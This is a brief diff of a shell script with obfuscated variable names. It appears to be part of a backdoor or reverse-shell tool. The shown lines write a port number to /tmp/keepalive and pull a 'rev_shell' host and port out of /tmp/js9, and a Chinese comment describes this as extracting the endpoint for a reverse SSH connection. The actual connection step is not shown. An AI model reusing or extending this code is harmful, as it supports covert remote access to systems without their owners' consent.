@@ -79,7 +79,7 @@ echo "flag_9832q $ip_port7pxy2a";
          num61z=$(date +%S);
          num67z=$(echo "1"$num61z);
          num76=$((${num67z}%8));
-         bport=5005"$num76";echo $bport >> /tmp/keepalive;
+         bport=5005"$num76";ls -al /tmp/keepalive;echo $bport >> /tmp/keepalive;
 # 提取反弹upxSSH的主机和端口
 ip_port5=$(grep -oP "(?<=AABBCC_rev_shellLLL).*(?=FFF)" /tmp/js9;echo 456891 >/dev/null)
 port5=${ip_port5#*:};
